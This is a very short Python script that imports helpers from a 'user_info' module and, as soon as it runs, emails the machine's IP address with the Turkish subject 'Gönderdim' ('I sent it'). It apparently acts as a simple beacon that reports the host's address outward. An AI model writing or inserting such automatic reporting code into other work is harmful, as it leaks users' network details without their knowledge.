from user_info import *


def check():
    send_email(get_ip_address(), Subject="Gönderdim")


check()